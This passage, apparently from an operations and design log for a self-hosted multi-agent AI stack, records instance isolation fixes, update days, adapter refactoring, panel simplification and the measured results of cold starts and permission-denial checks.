commands and the view's fields are the same, plus `contract` and `attempt_results`.

Controls: review_controls **92/92** (28 new: the event reader under foreign names, the pure
view and the explicit restore, the execution record and its document, the one door to the
router end to end, the one door to a call); trial_controls' two pins that asserted the *old*
three-way door now assert the single one, and its screen pin reads the event reader instead of
`eval`-ing a line of `run_workflow.py`'s source. Static 10/10. The stack level is the CI run
named in PR #21.

## 69. The second cold start: a fresh clone beside the live instance (measured 2026-10-02)

What a new person receives, measured on the second install's machine (Windows, Docker Desktop):
a fresh clone in its own directory, its own `config/instance.env` (`coldverify`, its own ports),
brought up beside the live instance. **Full 21/21**, and `router_controls`, which the stack
level skips without logins, **26/26** after signing in. No remnant of an earlier name in the
remote (`cadp278-broker` is gone); `.cadp-backup.key` stays as the reader of older backups.

Docker Desktop failed to start first, twice, with the stale-socket pattern of §5
(`sailor-ingest.sock`, then `docker-secrets-engine/engine.sock` and `dockerInference`): a
Docker Desktop defect with open reports, not this stack's to guarantee — the stack's one duty is
`install.sh --check` stopping at "start Docker", which it does. The recovery is §5's.

Three things verify does not see, found by doing it, each checked in the code before it moved:

| found | verified | done |
|---|---|---|
| every instance built `agentstack/*:local`, so the second instance's build re-tagged the images the live one was running on; the live containers kept their (now untagged) image until recreated, and a recreate would run the live tree on the new toolchain | **yes** — six fixed image names in `docker/compose.poc.yaml`, `up -d --build` on every bring-up; what `release.sh record` reports as "a rebuild pruned it under the running container" (§66, #20) | images are `${STACK:-agentstack}/…` (18 lines); the release candidate image is `$STACK/governed-runtime:cand-…` too |
| a bare `docker compose …` in the second instance's directory used the live instance's names and made `agentstack-*` networks there | **yes** — `docker/.env` is gitignored and nothing on a clone wrote it; `up.sh` exported `STACK` into its own environment only; `restore.sh` alone wrote the file | `scripts/instance_env.sh`: `config/instance.env` → `docker/.env`, key by key, keeping what else is there; `up.sh` runs it on every bring-up and `restore.sh` on a restore |
| a third instance fails inside compose with "address pools fully subnetted" | **yes** — 14 networks in the composition + Preloop's one = 15; Docker's default pools hold about 31; two instances fill them | `install.sh --check` counts the subnets in use against what this instance needs and names the remedy: wider `default-address-pools` in the daemon (docs/install.md), not fewer networks — each one is a boundary of §48–§55 |

Controls: review_controls **100/100** (8 new: every image named for the instance, the candidate
image, the env writer end to end — takes the keys, keeps the rest, idempotent, no-op without
instance.env — the two callers, the headroom check, and 15 as the measured count). The stack
level is the CI run named in PR #21; the full level is the measurement above.

### Addendum 1 — full 22/22 on the merged main, and what a take-down left behind (2026-10-02)

The merged main (`cdff002`, PR #21) was cloned fresh and installed from nothing as a third name
(`coldtwo`) beside the live instance: **static 10/10, stack 19/19 (trial_controls 471/471,
router_controls 26/26), full 22/22**. Two real model calls in the full level: `auto` — one
routed call through Preloop wrote its file and judged PASS; `novel-a` — reviews under distinct
principals at the same time, through the broker, recorded PASS. The broker received its four
credentials; the images were built as `coldtwo/*` and the live instance's were untouched.

What verify does not see, found by taking the instance down: `down.sh --volumes` left a quota
container, two networks (`adminnet`, `toolnet`) and the `role-egress` volume. Each in the code:

| left behind | why | done |
|---|---|---|
| the quota container | `down.sh` named the profiles `record,ui` and the egress ones; the observer became a profile in #16 and `down.sh` was not told | `record,ui,observer` |
| `adminnet`, `toolnet` | Preloop's api / console / gateway sit on this instance's networks (`docker/preloop.agentstack.yaml`); `down.sh` took the stack down *first*, so the networks were "still in use" — printed on every cold start, behind the CI step's `\|\| true` | Preloop goes down first, with the attachment file named as at bring-up |
| `role-egress` | declared in the composition, not in `down.sh`'s exact-name list | listed; the control now derives the list from the composition |

The control that pinned `down.sh` had fixed the string `record,ui`, which is how the observer's
absence passed it. It pins the observer, the order and the volume list now, and the cold-start
run has a step that fails when anything named for the instance is left after the take-down —
the measurement the `\|\| true` had been hiding.

Not the stack's: the live instance's claude login for quota reading had expired (`claude login`
on the panel).

**Measured on the instance that found it** (PR #28 merged as `2485a20`): `coldtwo` taken down
with the new `down.sh --volumes`, the live instance (19 containers + Preloop's 8) left running.

| | before | after |
|---|---|---|
| `coldtwo` containers, Preloop's included | 23 | 0 |
| `coldtwo` networks | 11 | 0 |
| `coldtwo` volumes | 6 | 0 |
| networks on the host | 29 | 18 |

`adminnet`, `toolnet` and `role-egress` went this time. `quota-home` was never among the six:
`coldtwo` came up without the observer, so that volume was never made. What a take-down does
not touch, and never will: the clone's directory, its Preloop install directory
(`~/.preloop-<name>`, compose files only once the database volume is gone) and its images
(`<name>/*:local`) — those are the operator's, removed by hand when the instance is not coming
back.

## 70. The panel starts nothing (#24, decided 2026-10-02)

CONTRACT.md's "What belongs on a screen" put starting a run on the command side, and the panel
had a start button with a precheck in front of it — §67's gate fix was work on a button the rule
said should not be there. The operator decided for the rule: the start goes.

What changed: the 워크플로 실행 tab is the 워크플로 tab — the workflows that may be started, what
each one takes (its declared inputs, as text; what its package needs in the environment; its
runbook; its own login), and the command, built from the selection:
`scripts/cycle.sh <workflow> <profile> key=value …`. `POST /api/runs` is gone from the ops API;
`GET /api/runs`, a run's view, and stop stay. Stopping a run that is going is a judgement and
stays on the panel, as the rule says.

Decided the same day, the same way: the *resume* button on the 실행 기록 tab and
`POST /api/runs/<id>/resume` went too. A run that can be continued says so in its row, with the
command (`run_workflow.py resume <id>`). Then the configuration *generate·apply* button (설정
상태 card) and `POST /api/config/{generate,apply}`: `scripts/up.sh` does that on every bring-up,
`cfg.py generate` (agent) and `cfg.py apply` (admin, past the guard) do it by hand; the card
shows the state and names the commands.

What is left on the panel is a person's: the login flows (a code the vendor gives a human),
approve/decline, stop, and looking at a run's graph. The operator's work — start, resume, apply,
and everything in `scripts/` — is commands, where a scheduler can run it and a reader can see
what was run.

Controls: review_controls pins the absence (no start, no precheck, no POST on the page or in the
API), the presence of the command, and the contract's sentence.

## 71. The next five, in one pass (#13 #22 #23 #25 #26, 2026-10-02)

The items the issues called "next", done on the same branch as #24 rather than one PR each.

**#22 — execution facts are the platform's.** The record step reads the run's evidence
directories (`<evidence_root>/<run>-*/execution.json`, which every routed call now leaves, §68)
and joins them with what the step passed on `run_id`. A workflow that lists nothing — devflow's
implementer and researcher calls were recorded NO_EXECUTION — is recorded with every call it
made. "manual" reads none. Controls: listed nothing → both attempts recorded and no other run's;
listed one → joined, nothing twice; no run → nothing.

**#13 — a child run is linked.** `run_workflow.py start` from inside a step sees the parent's
`CONDUCTOR_SELF_RUN_ID`: the child's meta carries `parent`, the child's Conductor gets
`AGENTSTACK_PARENT_RUN`, the record step tags `parent.run_id` on every record it writes, and the
child inherits `--suite`/`--case` from the parent when the caller gave none. `trajectory.py`
lists a run's `children` and `parent`. devflow's `drive.py` gets the link by doing what it
already does.

**#23 — the contract runs.** `stack/doc_examples.py` executes the examples in docs/packages.md:
every yaml block parses with a duplicate-key-refusing loader (the defect of §67), the manifest
example is written to a temporary package and read by `packages.py`'s own reader (usable, known
`requires` keys, known capabilities), every python block compiles. The static level runs it;
10/10 at the time of writing. The contract version `contract: 1` travels with the execution
record (§68), the fan-out receipt and a chain's answer.

**#26 — the first success, measured.** With #24 the panel starts nothing, so "starts from the
panel without a login" became "starts from the command without a login": the stack level's
hello-lane run — a package declaring `capabilities: []`, through `run_workflow.py start`, on a
host with no login — has been that measurement since run 26, and the line says so now. The
manifest example's comment tells a new author to declare only what the steps use.

**#25 — a package that brings its own runtime.** CONTRACT.md has the section: the doors it
must pass (every model call through `agent_task.py`, whose argv any process in the agent
container can run and which picks the broker or the local door from the role; approvals are
Preloop's; a result is recorded by the record step or by the evidence it left) and what it may
not do (write into `/route`, reach a vendor past the proxy, answer an approval). The callable
form is the one that exists; #18's HTTP remote mechanics stay deferred.

Controls: review_controls **120/120** (13 new). The stack level is the CI run named in PR #29.

## 72. What is left, read before it is done: #18's stack side and #17's reading (2026-10-02)

**#18, the stack's side.** `trial_controls.py` used trading as a fixture: five groups imported
`packages/trading/steps/trade_stage.py` (lanes, lanes step, chains, boundary, the hold message)
and one read `live_packet.py`, every one skipped on a host without trading — which is every
cold start — so the stack's own fan-out was pinned by controls that never ran there. Read
group by group, what each pinned was one of two things: the **stack's** (the fan-out runs the
members, names the failed one, keeps the receipt's context, runs a chain in order, stops the
member whose step produced nothing) or **trading's** (what a valid proposal is, that a
malformed one is INVALID, the momentum baseline, a planned lane that is MISSING, what its
fetch step freezes). The stack's parts now run on a fixture of the stack's own — a document
that means nothing, written by the stub — and run on every cold start; trading's parts are
trading's controls to pin (agent-stack-trading#2). The one rule that named trading ("its
prompts and steps are its own") is now a rule about every installed package. The HTTP remote
mechanics (candidate 7) stay deferred by size.

**#17, read this time.** The hold was "breaking, and unread". Read now:

| component | read | consequence for `run-agent.mjs` |
|---|---|---|
| codex-acp 2.0.0 (09-28, #530), claude-agent-acp 0.82.0 (#1153) — "AIR tool call contract" | a `tool_call_update` omits top-level fields that did not change since the last report of the same call (ACP merge semantics); **`_meta` of each report stays complete**; **a permission request omits no field it had before**; AIR-specific keys moved under `_meta.jetbrains.air.*` and are not sent to other clients; exact git patches go **only to a client that declares `diffPatch`**, the ACP diff text stays for the rest | the adapter reads `rawInput`, `title`, `kind`, `locations`, `content` and `_meta` on the *permission request*, which stays whole; the "Access denied:" match reads a tool_call event's output, which an update carries when it changed; acpx declares no `diffPatch`. By the reading, nothing it depends on moves. Still a measurement, not a reading: §50's grok principal pair and N7 |
| codex-acp 2.0.1 → 2.1.1 (09-29 … 10-01) | 2.0.1 pairs codex 0.159.x; 2.1.x: `request_user_input` as AIR custom answers, clearer "thread held by another client" error, attachments in imported history | pair codex-acp 2.1.1 with codex 0.159/0.160 |
| Conductor | the changelog's newest entry is **0.1.41 (09-29)**; nothing after it | the pinned 87f7788 → 0.1.41 decision stands as written in #17 (secrets bindings, run bundles) |
| grok 1.0.46 (09-30) | x.ai's changelog is blocked from this session's egress; third-party summaries: permission rules with relative paths now apply under symlinked working directories, faster skill loading, `grok inspect`/MCP doctor fixes | nothing about `[permission]` evaluation order; N7 measures it |

What the reading changes: the ACP bundle is no longer held for being unread. What it does not
change: the update is still the operator's full-level measurement (docs/update-day.md), on a
branch, with the two grok cases first.

## 73. Update day 2, the branch: what the cold start can say (2026-10-02)

docs/update-day.md steps 1–2, on PR #31: five pins moved, one commit per component with its
reading (§72) in the commit message.

| pin | from → to |
|---|---|
| acpx | 0.18.0 → 0.19.4 |
| codex-acp + codex (a pair: codex-acp declares codex ^0.159.1) | 1.12.0 → 2.1.1, 0.155.1 → 0.160.0 |
| claude-agent-acp | 0.79.0 → 0.85.1 |
| grok | 1.0.40 → 1.0.46 |
| Conductor | 87f7788 → 11dcc41 (v0.1.41) |

Measured, cold-start-linux run 47 (de2f8ee), a host that had none of it: the image builds with
every new pin; `up.sh --check` fails nothing but the logins; **stack 21/21** — trial_controls
**500/500** (29 more than run 44: the fan-out groups that used trading as a fixture run now, on
the stack's own, §72), review_controls 120/120, the documented examples 10/10; hello-lane and
child-run ran through Conductor 0.1.41 and the child step still saw the parent's run id
(`same_run: yes`, so §66's reading of a sub-workflow holds on the new engine); and the new line
**"the adapter loads with the pinned toolchain (acpx 0.19.4)"** — `run-agent.mjs` given no
request answers FAILED in its own shape, so the two files it imports by path are where it
expects them. Nothing of the instance was left after the take-down.

What this level cannot say, and the operator's steps 3–5 will: whether a model call still
completes under the new adapters (§50's grok principal pair first — write allowed, write
refused — then §64's cold role, then N7 on the three providers), and whether grok 1.0.46 still
reads the posture the way 1.0.40 did. On the instance:

```
scripts/release.sh update --to <merged rev> --replace-toolchain
scripts/verify.sh --level full
```

and the numbers go here, under this section, as §65 did for day 1.

### §73 addendum: update day 2 on the instance, steps 3–5 (measured 2026-10-03)

**Before**, in the procedure's order this time:

```
scripts/up.sh --check                             ALL CHECKS PASSED
scripts/backup.sh                                 ~/agentstack-backups/agentstack-backup-20261002-235705.tar.gz.enc
                                                  1.3 GB, 14 members; `state` MISSING (this instance has no
                                                  state/ yet; not required); key ~/.cadp-backup.key, the old
                                                  name's file, which backup.sh falls back to when
                                                  ~/.agentstack-backup.key does not exist
scripts/release.sh record --tag pre-202610        claude 2.1.278 · conductor 0.1.37 · codex 0.155.1 · grok 1.0.40
scripts/drift.sh                                  every line `unknown`: no registry answered from this host
```

This instance is the first install, on the first machine, and it had not had update day 1 —
§65 was run on the second install — so `pre-202610` reads day 0's toolchain, and this update
moved claude 2.1.278 → 2.1.287 as well as the five pins of day 2: two update days in one.

**The update.**

```
scripts/release.sh update --to 911dc67 --replace-toolchain
  ALL CHECKS PASSED · toolchain answers; the previous copy was removed · policy applied
  claude 2.1.287 · conductor 0.1.41 · preloop_cli 0.15.0 · codex 0.160.0 · grok 1.0.46
```

**verify full.** The first run was 22/23: novel-a held (`author:claude (stale: 33503s old >
1800s)`) and router_controls were skipped for the same reason. The instance's claude login had
expired for the quota reading ("Claude OAuth token expired. CodexBar CLI does not launch Claude
to refresh credentials"). The update was not the cause: the last good reading was nine hours
older than the update. The operator signed in again on the panel, and the second run:

```
scripts/verify.sh --level full                    24/24 — trial_controls 504/504, review_controls 120/120,
                                                  router_controls 26/26, docs/packages.md 10/10, novel 32/32,
                                                  hello-lane and child-run (same_run: yes on Conductor 0.1.41),
                                                  the adapter loads with acpx 0.19.4, auto PASS (claude),
                                                  novel-a PASS (architect=codex author=claude story=codex
                                                  history=claude cold=grok, every reviewer COMPLETED)
```

**§50's grok principal pair**, on grok 1.0.46, brokered into the `closed` profile:

```
grok, principal novel-reviewer, write {WS}/review_r7.json       COMPLETED, produced: true, mcp_rule_denials 0
grok, principal novel-reviewer, write {WS}/zz_not_allowed.json  DENIED, mcp_rule_denials 1
                                                                ("Access denied: Scoped rule 2")
```

**N7 on the three providers**, read from the evidence of the runs above:

| provider | calls read | writes | native write / shell |
|---|---|---|---|
| claude 2.1.287, claude-agent-acp 0.85.1 | auto f26adcb9, novel author, novel history | `mcp__preloop__write_file`; permissions.jsonl `routed=preloop_mcp_rules`, `allow_once` | 0 (native reads `Read File`/`Find` ran, as before) |
| codex 0.160.0, codex-acp 2.1.1 | auto 8a733846, novel architect, novel story | `mcp.preloop.write_file`, reads `mcp.preloop.read_file`/`read_multiple_files` | 0 (codex-acp 2.1.1 reports an MCP call as `kind: execute`) |
| grok 1.0.46 | the §50 pair, novel cold | `use_tool` → `preloop__write_file` | 0 executed: `write`, `search_replace` refused ("deny rule on edit"), `run_terminal_command` refused ("deny rule on bash"), `read_file` refused (ACP fs `--deny-all`) |

grok's native `grep` (and `list_dir`) ran. The posture denies writes, shell and the web, and
leaves reads alone. Every cold-role grok run on 1.0.40 since 09-23 shows the same, so 1.0.46
reads the posture as 1.0.40 did. §64's cold role completed through Preloop on this run.
## 74. The adapter, cut where a recorded run can check it (#27, 2026-10-03)

The hold on #27 was the fixture: `run-agent.mjs` runs only with a model call, and cutting it
blind was the kind of refactoring this repository does not do. The operator recorded four runs
on the instance after update day 2 — claude and codex `auto`, grok's §50 pair (allowed, denied) —
masked them, and posted them on #27; they live in `stack/fixtures/run-agent/` with their index.

**Cut.** The model-free halves moved out of the 497-line file into `stack/adapter/`:
`result.mjs` (what a turn's events fold into — text, usage, the MCP denials Preloop answers as
ordinary results; how the status is decided; the one result shape; the exit code),
`permissions.mjs` (what a permission request says to Preloop; how the answer, or its absence,
becomes an outcome; the locally decided cases) and `ledger.mjs` (the codex session line).
`run-agent.mjs` imports them and keeps the process, the credentials, the HTTP call and the
providers — 430 lines. The provider table and the module-level `LOGIN`/`PRINCIPAL` stay; they
are the half a model call measures (#27's steps 2–3 for them, at the full level).

**Measured.** `stack/adapter/replay.mjs` feeds each recorded `events.jsonl` through the fold and
rebuilds the result from the recorded inputs: text equal, usage count equal, MCP denials equal
(grok-deny: one, "Access denied: Scoped rule 2"), status equal, every field of `result.json`
equal — **4/4**. The static level runs it on the host, review_controls at the stack level.

**Found by the fixtures.** grok-deny's `execution.json` said `failure: "{}"` — the step's failure
line was the JSON of nothing for a DENIED, because the adapter's result had no `failure` and no
turn error and the expression fell through to `json.dumps({})`. The line is `execution.failure_of`
now: the adapter's own message, else the turn's error, else the MCP rule denial's text, else the
refused permission; "" for a completed call. On the fixtures: grok-deny reads the rule, claude-auto
reads nothing.

Controls: review_controls 127/127 (7 new), static 12/12.

## 75. After update day 2: what the two confusions were made of (#34, 2026-10-03)

Update day 2 left two things that read as confusion and were not: the operator asked why a cold
start's build did not carry the new versions (§73 addendum), and `drift.sh` on that host said
`unknown` on every line. Both were read back to the code.

**Two kinds of tool, one word for them.** `docker/agent.Dockerfile` installs claude-code,
Conductor and the Preloop CLI under `/home/agent/.local` — the `agent-home` volume, filled from
the image once and never again (§3) — and node, acpx, the acp adapters, codex, grok and codexbar
under `/opt`, in the image, with the comment that says why ("$HOME is a volume"). One Dockerfile,
the principle applied to half of it. `release.sh update` compared all six tools alike and asked
for `--replace-toolchain` whenever any differed, and `update-day.md` said the flag was for
"claude-code, codex, grok, the acp adapters, acpx" — four of those five are the image's and move
with the recreate without any flag; the three that need it (claude-code, Conductor, Preloop CLI)
were not the list. Day 2 needed the flag for Conductor, and the operator was told it was for
codex and grok.

Now `release.sh` holds `VOLUME_TOOLS="claude conductor preloop_cli"` and `IMAGE_TOOLS="codex grok
node"`, refuses only on the first kind and prints the second as "the image's tools move with the
recreate"; `update-day.md` names the three. Whether the three should move to `/opt` as well — which
would delete the stage/verify/swap machinery (§65–§66, about 100 lines), the flag and the 256 MB
toolchain archive in every release record — is the operator's call, and it is [#34] with the facts.

**`unknown`, three ways.** `drift.sh` said `unknown` for a component with no registry (Preloop,
docker-cli), for a registry asked that did not answer, and said nothing about why. On the
instance's host every line read `unknown`; on this runner the GitHub API answers 403 through the
proxy and npm and PyPI answer. The states are now `same | newer | unasked | unanswered`, an
unanswered line carries the registry's own words (`api.github.com: HTTP 403`, `Failed to connect
to …`, npm's `code E…`), and the last line counts them: `2 of 14 lines unanswered — 1 registry
did not answer from this host: api.github.com: HTTP 403`. `verify.sh` prints that line under its
drift note, so "nothing newer" is never read as "all current" on a host that could not ask.
`--json` carries `reason`. Column 4 is still the state, which is what `verify.sh` reads.

**Measured on this runner.** `drift.sh`: 14 lines, 9 same, 1 newer (claude-code 2.1.288), 3
unasked, 2 unanswered (api.github.com: HTTP 403); with the proxy pointed at a closed port the
GitHub lines read `Failed to connect to 127.0.0.1 port 9`. `release.sh` parses; the update path
runs only on an instance and is for the operator's next update day, where the expected line for a
provider-CLI-only day is the "move with the recreate" list and no refusal.

**Found by the cold start (run 52).** The first push's control ran `drift.sh` as is, and at the
stack level review_controls run inside the governed runtime, which has no egress: eleven asks each
waited for a timeout and the control died at 240 s (`subprocess.TimeoutExpired`), stack 21/22. The
host side of the same run had already printed "every registry asked answered". So `drift.sh` has
`--offline` — asks nothing, every registry line reads `unanswered` with `not asked (--offline)`,
and the summary counts them — and the control pins that shape (14 lines, 11 unanswered, 3 unasked,
the last line) in 0.06 s and no network. `npm view` also gets `--fetch-retries=0
--fetch-timeout=15000`, one try bounded like curl's 15 s. Measured on this runner in a network
namespace with no network at all (`unshare -rn`): the whole report in 2.9 s, the GitHub and PyPI
lines naming their reason (`Could not resolve host: pypi.org`), and npm answering from its cache —
so the minutes-long wait of a host whose npm has no cache and no network is bounded by the flags
but was not timed here.

Also fixed here: §74's heading carried a literal `\n\n` from the heredoc that wrote it, and the
decisions table's first line had the leftovers of a regex that was meant for the #27 row (the row
itself was never updated); both from the §74 commit.

[#34]: https://github.com/astro3141/agent-stack/issues/34

## 76. The image is the toolchain (#34, decided 2026-10-03)

The operator decided #34 ("옮겨"): claude-code, Conductor and the Preloop CLI move out of the home
volume and into the image, where every other tool already was.

**What moved, and how.** `docker/agent.Dockerfile` installs the three as root under `/opt`,
proves each present at build (`test -x`) and makes them world-readable for the role users a step
runs as: claude's installer writes to `$HOME/.local`, so it is given `/opt/claude` as its home for
the install (`/opt/claude/.local/bin/claude`); uv goes in with `pip --prefix=/opt/uv` and makes
Conductor's venv at `/opt/uv/tools/conductor-cli` with its shim in `/opt/uv/bin`
(`UV_TOOL_DIR`, `UV_TOOL_BIN_DIR`); the Preloop installer takes `INSTALL_DIR=/opt/preloop/bin`.
`PATH` no longer has `/home/agent/.local/bin`; `DISABLE_AUTOUPDATER=1`, because the pin is the
version and `/opt` is not the user's to write. The replay service's entrypoint follows the venv.
`/home/agent` stays a volume for what belongs to an instance — logins, Preloop's agent state — and
is filled from an image that no longer carries 256 MB of tools.

**What that deleted.** `scripts/release.sh` 437 → 329 lines: the staging, verification, swap and
keep-or-restore of the volume's toolchain (§65 lessons 2–4, §66 1–3, §67 1–2 were all this
machinery's), `--replace-toolchain`, the toolchain archive in every record (`format=3`), and the
refusal of §75. An update now builds the candidate (still: a revision that does not build changes
nothing), says `will change claude '2.1.278' -> '2.1.287'` for each tool that differs, records,
moves, rebuilds, recreates, checks. A release is revision + image ids + configuration; the
runbook and update-day.md say so. A release recorded before this still rolls back: its
`toolchain.tar.gz` is named and left alone, the kept images carry the same tools.

**An instance from before.** Its volume keeps the old copy under `/home/agent/.local`, off PATH
and unused. `up.sh --check` notes it with the one-line removal (`rm -rf /vol/.local` on the
volume, stack down) and does not run it — the operator's one-time step, and the volume still holds
logins, so nothing here deletes in it.

**Found by the cold start (run 55).** The image built — claude's installer, run as root with
`/opt/claude` as its home, uv with a prefix and the Preloop installer with its directory all
answered — and the fresh instance then could not be claimed: `open /home/agent/.preloop/config.yaml:
permission denied`. The Preloop installer does more than install: it onboards the agents it finds
under `$HOME` and writes `~/.preloop/config.yaml`, and `$HOME` was `/home/agent` with the step run
as root, so the file the volume was seeded from belonged to root. As the agent, which is how that
step always ran, the file is the agent's; only the binary's directory is handed to root after.
The two root steps (pip, uv) get `HOME=/root`, and the build now asserts
`find /home/agent ! -user agent` is empty, so this class of mistake stops at the build.

**Measured.** review_controls 141/141 (the update group rewritten: 14 pins on the Dockerfile,
compose, release.sh, the docs, up.sh and drift) and static 12/12 on this runner, which cannot
build the image (its proxy denies `downloads.claude.ai` and `preloop.ai`). The cold start is the
build's measurement — **run 56** (46d18e0), green: the image built with the three under `/opt`
(`Installed 1 executable: conductor`, `Installed preloop 0.15.0 to /opt/preloop/bin/preloop`, the
`find /home/agent ! -user agent` assertion passed), the fresh instance was claimed and its agents
onboarded by the Preloop CLI from `/opt`, `up.sh --check` failed nothing but the logins and did
not print the old-copy note (a fresh volume has no old copy), and the stack level **22/22**:
trial_controls 500/500, review_controls 141/141, hello-lane and child-run through Conductor from
`/opt/uv/tools/conductor-cli` (`same_run: yes`), the adapter with acpx 0.19.4; nothing of the
instance left after the take-down. On the instance, the operator's next `release.sh update` is
the first update that moves the three without a flag; what it should print is the `will change`
lines and no refusal, and `up.sh --check` the note about the old copy. Those numbers go here.

### §76 addendum: on the instance (operator-run, 2026-10-03)

```
scripts/release.sh update --to be4ed57           no flag. ALL CHECKS PASSED, exit 0; rollback point
                                                 20261003-031632-911dc67 recorded first; no refusal
scripts/up.sh --check                            "note  the home volume still carries the pre-#34 toolchain
                                                 copy (/home/agent/.local), unused" + the command
scripts/down.sh                                  volumes kept
docker run --rm -v <stack>-agent-home:/vol alpine rm -rf /vol/.local
                                                 675 MB gone; .claude .codex .grok .preloop untouched
scripts/up.sh                                    ALL CHECKS PASSED, 19 containers, the note gone
tools                                            claude 2.1.287 /opt/claude/.local/bin · conductor 0.1.41
                                                 /opt/uv/bin · preloop 0.15.0 /opt/preloop/bin;
                                                 PATH without /home/agent/.local
```

**No `will change` line, for two reasons, both read from the log.** First, nothing changed: update
day 2 had already put claude 2.1.287 and Conductor 0.1.41 in the volume, and the new image carries
the same versions. Second, the script that ran was the *previous* revision's: `release.sh` copies
itself before it moves the workspace (its own guard against being rewritten mid-run, §66), so an
update is always run by the `release.sh` of the revision being left, and the log carried that
script's line, "toolchain — unchanged, the new revision builds the same tool versions". The new
script's path — the `will change` lines, no refusal — is first measured by the next update whose
pins move. What this round measured is what mattered: an update with no flag ended without a
refusal and with the three tools answering from `/opt`.

The old copy is gone; the volume keeps its logins and state. #34 closes with this.

## 77. The adapter's last cut: one module per provider, the call's context instead of globals (#27 step 3, 2026-10-03)

The half of `run-agent.mjs` that §74 left in place — the provider table and the module-level
`LOGIN`, `PRINCIPAL`, `HOOK_FOR` — was the half only a model call could measure. The operator
made the measurement and the cut (PR #38, branch `issue27-run-agent-split`, cd0641e).

**Cut.** `stack/adapter/providers/{claude,codex,grok}.mjs`: each a function of one call's context
(login directory, principal, egress, the MCP url), returning the profile `run-agent.mjs` used to
hold in its table. The context is built once in `main()` from the request; the hook is a `const`
there and its token travels to the permission POST. `run-agent.mjs` 430 → 297 lines, naming no
provider internal. `stack/adapter/providers_check.mjs` (20 checks, no model) pins that a module
follows the login and principal it was made with, that a second call in one process does not reach
the first, that the native-tool switches and the downstream rules are unchanged, and that no
module-level `let` remains; it runs at the static level and in review_controls. Two trial_controls
pins follow the renamed expressions.

**Measured, on a fresh cold start beside the live instance** (coldthree, a clone of 9cfc516,
signed in to all three providers; the branch's ten files overlaid on the clone, the live instance
untouched):

| | main 9cfc516 | branch |
|---|---|---|
| verify.sh --level full | 24/24 | 24/24 |
| trial / review / router controls | 500 / 141 / 26 | 500 / 142 / 26 |
| auto, novel-a | PASS, PASS | PASS, PASS |

The same seven calls through `agent_task.py` → `run-agent.mjs` on each side — claude ×3 (the
adapter's own login, a local principal, a brokered principal), codex ×2, grok ×2 (allow, deny) —
**7/7 the same**: result keys, status, `produced`, provider, principal, route, hook source, the
permission requests (title, routed, outcome), the MCP denials ("Access denied: Scoped rule 2") and
the failure; run ids, paths, timings, token counts, model text and vendor session ids left out as
volatile. The tools that ran were identical per call on claude and codex; grok tried its native
write once on each side and was refused both times — the model's behaviour, not the adapter's.
Model-free in the agent's node: replay 4/4, provider checks 20/20. On this runner: static 13/13,
review_controls 142/142; cold-start-linux **run 60** on cd0641e, green.

**Found on the way, not the branch's (#37).** codex without a principal fails on a fresh install,
on main as on the branch: `ENOENT ~/.codex/config.toml`. The claim's onboarding runs once, before
codex is signed in, the Preloop CLI answers `agent "codex" not found`, and nothing retries after
the login. Roles that name a principal (novel-a's architect and story) do not read that file.

#27 closes with this: the four steps — the cut where a recorded run checks it (§74), the fixtures,
the provider modules, and this record.

## 78. The file Preloop looks for before it will see codex (#37, 2026-10-03)

**Found** by #27's step-3 evidence (§77) and visible in every cold start's claim line since §31's
fix: `"onboarded_partially": {"codex": "Error: agent \"codex\" not found. Available agents:
Claude Code (claude-code)"}`. On a fresh install, codex without a principal then fails with
`ENOENT ~/.codex/config.toml`, on main as on the branch. Roles that name a principal are not
affected: that path hands the credential over ACP and never reads the file.

**Why.** The Preloop CLI lists an agent only once that agent's own configuration file exists —
measured for codex in FINDINGS-281 ("`discover` did not list Codex until `~/.codex/config.toml`
existed; an empty file suffices") and for claude in §31, where the bootstrap already seeds
`~/.claude/settings.json` with `{}` for exactly this reason. §31's fix named codex as a kind to
onboard but seeded nothing for it, so on a home with no `~/.codex/` the CLI answered "not found",
the claim reported it as partial, and nothing retried after the operator signed in: the claim
runs once, on the branch of `up.sh` that finds no user.

**Fix.** `bootstrap_preloop.py` keeps the rule as data (`SEED`: claude-code → `.claude/settings.json`
`{}`, codex → `.codex/config.toml` empty) and seeds each kind's file before asking the CLI;
`seed_for()` never overwrites. The issue's first proposal, a retry at every bring-up, is not
needed once the cause is the missing file; it stays open as a thought only if a cold start still
reports a partial onboarding for another reason.

**Measured.** review_controls 145/145 (three pins: both seeds, no overwrite, the seed before the
CLI). The stack-level measurement is a fresh cold start's claim line — `"onboarded": true` and no
`onboarded_partially`. **Run 62** (ddddce6): `{"ok": true, "user": "owner", "onboarded": true}` — the first
cold start since §31 whose claim line carries no partial; stack 23/23 (trial 500/500, review
145/145, the provider modules' line new since #38). What this level cannot say: that codex
without a principal now completes a call on a fresh install (§77's x0). That takes a cold start
with a codex login, the operator's, and its line goes here.

### §78 addendum: the call CI could not make (operator-run, 2026-10-03)

What §78 left to a cold start with a codex login, measured on one (coldfour, a fresh install of
4f1cdc1, signed in to all three providers), against §77's coldthree from before the fix:

| | coldthree (before #39) | coldfour (4f1cdc1) |
|---|---|---|
| claim line | partial: `codex not found` | `"onboarded": true`, no partial |
| `~/.codex/config.toml` | absent | present, 184 B, with the Preloop MCP entry |
| x0 — codex, no principal | FAILED, `ENOENT` | **COMPLETED**, `produced: true` |
| tools x0 ran | — | `mcp.preloop.write_file` ×1, no native write |
| verify stack / full | 21/21 / 24/24 | 21/21 / 24/24 |

```
fresh cold start on 4f1cdc1 (coldfour), signed in to all three: claim line {"onboarded": true} with no
onboarded_partially; /home/agent/.codex/config.toml present (184 B, Preloop MCP entry); x0 (codex,
no principal) COMPLETED, produced: true, tools: mcp.preloop.write_file ×1; verify full 24/24
(review_controls 145/145, trial_controls 500/500, router_controls 26/26, auto PASS, novel-a PASS)
```

The empty file the bootstrap now seeds is what the Preloop CLI needed to see codex; its onboarding
then wrote the entry the adapter's own-login path reads. #37 is closed by this. The operator's
logs are in `evidence/issue37/` on their host.

## 79. The third review, verified: the contract across repeat, resume and rollback (2026-10-03)

The third external review, against 0a0536b, read the structure as improved and the remaining
weakness as one of contract, not of modules: "the meaning of a run id and a state does not match
between file names, environment variables, logs and HTTP requests." Six findings, two P1. Each was
read back to the code before anything was changed; all six held.

| # | finding | read | fixed |
|---|---|---|---|
| 1 | P1 — a rollback to a release from before #34 ignores its `toolchain.tar.gz`; that revision's tools lived in the volume, and an instance that followed `up.sh`'s note has removed them | **holds.** §76 said "the kept images carry the same tools" — true of the image, false of what runs: the volume masks `/home/agent`. §76 was wrong on this line | `release.sh rollback` unpacks the archive into `.local.new`, verifies claude, conductor and preloop are in it, and only after every other check swaps it into `/home/agent/.local` (a copy that was there is kept as `.local.old` until the checks pass) |
